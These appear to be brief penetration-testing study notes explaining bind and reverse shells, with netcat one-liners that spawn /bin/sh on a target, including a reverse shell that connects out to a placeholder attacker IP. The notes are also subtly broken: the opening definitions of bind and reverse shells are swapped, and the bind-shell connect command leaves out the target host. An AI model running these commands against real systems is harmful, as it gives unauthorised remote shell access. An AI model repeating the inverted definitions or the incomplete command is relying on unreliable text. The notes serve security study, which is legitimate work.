- 2 Types of shells:
	1. Bind Shell (open a port on victim and listen)
		- victim connects to you
	2. Reverse Shell (listens on attacker side)
		- you connect to victim

- using netcat for connections


- **bind shell**
	- listen on target machine and connect
- less common
	- mostly in external assesments
	- trying to bypass connection issues
 ```bash
# TARGET
nc -nvlp <PORT> -e /bin/sh
# ATTACKER
nc <PORT>
```

- **reverse shell**
	- listen for response from to target to connect
 ```bash
 # ATTACKER
nc -nvlp <PORT>
-n : no DNS (numeric only)
-v : verbose
-l : listen
-p : port

# TARGET
nc <ATTACKER_IP> <PORT> -e /bin/sh
-e : specify filename  to exec after connect
```
